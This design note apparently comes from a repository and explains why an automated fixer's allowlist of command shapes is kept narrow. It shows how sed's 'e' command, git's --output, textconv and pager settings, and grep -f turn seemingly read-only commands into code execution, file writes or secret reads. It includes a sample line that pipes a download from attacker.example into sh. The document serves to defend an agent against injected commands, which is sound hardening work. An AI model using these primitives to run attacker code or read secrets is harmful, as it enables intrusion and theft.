# Why the Refutation-Clause Shapes Are That Narrow

The [allowed invocation shapes](./refutation-clause-execution.md) look over-restrictive until you
see what the wider form of each command does. Read this before widening any of them.

## An Allowlist of Verbs Is the Wrong Unit

The first word of a command tells you almost nothing. Real commands carry flags and, in `sed`'s
case, an embedded mini-language, and that is where the execution and write primitives live. Every
example below starts with a verb a reasonable person would call read-only.

## `sed`

GNU `sed` executes a shell through the `e` command and the `s///e` flag, and **both work under
`-n`**. So `sed -n '1e curl https://attacker.example/x | sh' f` matches "starts with `sed -n`" and
runs whatever the attacker serves. This was confirmed empirically rather than reasoned about:
`sed -n '1e echo INJECTED' <file>` prints `INJECTED`.

Only a numeric range plus `p` is safe, which is why the shape is exactly `sed -n '<N>,<M>p'`.

## `git`

Two separate problems:

1. **`--output=<file>`** on `log` or `show` creates or overwrites an arbitrary path. That is a write
   primitive on a command the rules would otherwise treat as read-only, and writing a git hook
   turns it into code execution on the next git invocation.
2. **Git runs commands you did not name.** A `textconv` filter or pager configured in
   `.gitattributes` or `.gitconfig` is a command git will run on your behalf — and the PR's own
   diff may be what adds that file. Hence the pinned
   `-c core.pager=cat -c core.hooksPath=/dev/null --no-textconv` as part of the shape, not as an
   optional hardening.

## `grep` and `rg`

`-f <file>` reads patterns from a path, turning a search into a file read the clause never named.
`-P` enables PCRE backtracking, which hangs on a crafted pattern — a denial of service against the
fixer rather than a data leak, but still an attacker-chosen outcome.

## `cat` and `sed` Read Whatever They Are Aimed At

Neither writes, which is why both are allowed at all. But an in-repo path is not automatically a
safe path: this repo keeps real secrets in gitignored `.env*` files by convention, and they live in
the working tree. That is what the git-tracked requirement in rule 3 exists for — it closes the
class instead of blacklisting one filename.
